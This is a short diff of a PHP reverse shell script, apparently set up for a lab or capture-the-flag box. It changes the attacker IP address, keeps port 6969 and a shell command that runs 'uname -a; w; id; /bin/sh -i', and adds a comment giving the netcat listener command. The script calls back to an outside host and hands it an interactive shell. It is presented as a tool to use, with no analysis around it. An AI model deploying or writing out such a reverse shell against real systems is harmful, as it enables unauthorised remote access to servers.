@@ -2,7 +2,7 @@
 
 set_time_limit (0);
 $VERSION = "1.0";
-$ip = '10.10.246.216';  // CHANGE THIS TO REVERSE SHELL IP
+$ip = '10.10.77.51';  // CHANGE THIS TO REVERSE SHELL IP
 $port = 6969;       // CHANGE THIS FOR YOUR PORT
 $chunk_size = 1400;
 $write_a = null;
@@ -10,6 +10,8 @@ $error_a = null;
 $shell = 'uname -a; w; id; /bin/sh -i';
 $daemon = 0;
 $debug = 0;
+
+// START "nc -v -n -l -p 6969"
 
 //
 // Daemonise ourself if possible to avoid zombies later
@@ -143,6 +145,8 @@ function printit ($string) {
 }
 
 ?> 
+
+
 
 
 
